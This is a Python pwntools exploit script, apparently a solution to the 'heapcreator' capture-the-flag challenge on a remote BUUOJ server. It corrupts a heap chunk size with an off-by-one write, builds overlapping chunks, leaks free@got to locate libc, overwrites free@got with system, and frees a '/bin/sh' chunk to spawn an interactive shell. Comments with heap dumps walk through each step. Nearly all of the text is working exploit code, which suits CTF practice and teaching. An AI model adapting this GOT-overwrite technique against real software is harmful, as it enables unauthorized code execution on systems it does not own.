from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
# context.log_level = "DEBUG"

# p = process('./heapcreator')
p = remote('node3.buuoj.cn',29662)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)


def Create(size,content):
    p.recvuntil("Your choice :")
    p.send('1')
    p.recvuntil("Size of Heap : ")
    p.send(str(size))
    p.recvuntil("Content of heap:")
    p.send(content)

def Edit(index,content):
    p.recvuntil("Your choice :")
    p.send('2')
    p.recvuntil("Index :")
    p.send(str(index))
    p.recvuntil("Content of heap : ")
    p.send(content)

def Show(index):
    p.recvuntil("Your choice :")
    p.send('3')
    p.recvuntil("Index :")
    p.send(str(index))
    p.recvuntil("Size : ")
    size = int(p.recvuntil('\n',drop=True))
    p.recvuntil("Content : ")
    content = p.recvuntil('\n',drop=True)
    return size,content

def Delete(index):
    p.recvuntil("Your choice :")
    p.send('4')
    p.recvuntil('Index :')
    p.send(str(index))

def Exit():
    p.recvuntil("Your choice :")
    p.send('5')

def debug():
    gdb.attach(p)
    pause()

free_got = ELF('./heapcreator',checksec=False).got['free']
Create(0x18,'AAAA')
Create(0x18,'BBBB')
# 0x182a000:    0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0x182a010:    0x0000000000000018  0x000000000182a030 <== ponit to chunk1's size and content
# 0x182a020:    0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0x182a030:    0x0000000041414141  0x0000000000000000
# 0x182a040:    0x0000000000000000  0x0000000000000021 <== chunk2's strcut
# 0x182a050:    0x0000000000000018  0x000000000182a070
# 0x182a060:    0x0000000000000000  0x0000000000000021 <== chunk2's content
# 0x182a070:    0x0000000042424242  0x0000000000000000

# debug()
Edit(0, '/bin/sh\x00'+"a"*0x10+"\x41")
# 0xb5f000: 0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0xb5f010: 0x0000000000000018  0x0000000000b5f030 <== ponit to chunk1's size and content
# 0xb5f020: 0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0xb5f030: 0x0068732f6e69622f  0x6161616161616161
# 0xb5f040: 0x6161616161616161  0x0000000000000041 <== chunk2's strcut's fake size
# 0xb5f050: 0x0000000000000018  0x0000000000b5f070 <== point to chunk2's size and content
# 0xb5f060: 0x0000000000000000  0x0000000000000021 <== chunk2's content
# 0xb5f070: 0x0000000042424242  0x0000000000000000

# overwrite heap 2's size to 0x41

# debug()
Delete(1)
# debug()
# fastbins
# 0x20: 0x12b6060 <== chunk2's content
# 0x30: 0x0
# 0x40: 0x12b6040 <== chunk2's size
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x0
# 0x80: 0x0
# Create(0x30,'aaaa')
# 0x925000: 0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0x925010: 0x0000000000000018  0x0000000000925030 <== ponit to chunk1's size and content
# 0x925020: 0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0x925030: 0x0068732f6e69622f  0x6161616161616161
# 0x925040: 0x6161616161616161  0x0000000000000041 <== new chunk2's content
# 0x925050: 0x0000000061616161  0x0000000000925070
# 0x925060: 0x0000000000000000  0x0000000000000021 <== new chunk2's struct
# 0x925070: 0x0000000000000030  0x0000000000925050 <== point to new chunk2's size and content

# trigger heap 2's size to fastbin 0x40
# heap 2's content to fastbin 0x20

Create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
# new heap 2's struct will point to old heap 2's content, size 0x20
# new heap 2's content will point to old heap 2's strcut, size 0x30
# that is to say we can overwrite new heap 2's struct
# here we overwrite its heap content pointer to free@got(when we print, printf will print the loacation which free@got point to)
size,content=Show(1)
# 0x785040: 0x6161616161616161  0x0000000000000041 <== new chunk2's content
# 0x785050: 0x0000000000000000  0x0000000000000000
# 0x785060: 0x0000000000000000  0x0000000000000000 <== new chunk2's size which was overwrite right now
# 0x785070: 0x0000000000000030  0x0000000000602018 <== point to new shcunk2's size and content

# leak address
log.success('size = %d, content = %#x'%(size,u64(content.ljust(8,'\x00'))))
# debug()

free_addr = u64(content.ljust(8,'\x00'))
# libc_base = free_addr - libc.sym['free']
# system_addr = libc_base + libc.sym['system']
libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
log.info('system_addr = %#x',system_addr)

# overwrite free@got with system addr
Edit(1, p64(system_addr))
# trigger system("/bin/sh")
# debug()
Delete(0)
p.interactive()